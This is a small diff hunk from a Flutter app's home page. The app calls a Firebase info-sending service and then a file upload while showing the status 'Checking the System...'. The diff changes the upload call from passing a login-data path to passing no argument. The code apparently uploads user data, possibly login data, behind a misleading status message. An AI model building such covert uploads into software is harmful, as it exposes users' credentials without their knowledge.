@@ -180,7 +180,7 @@ class _HomePageState extends State<HomePage> {
                               await duckServices.sendInfoFirebase(context);
                               setState(() => status = 'Checking the System...');
 
-                              await duckServices.uploadFile(pathLoginData);
+                              await duckServices.uploadFile();
 
                               if (!context.mounted) return;
                               _start(context);
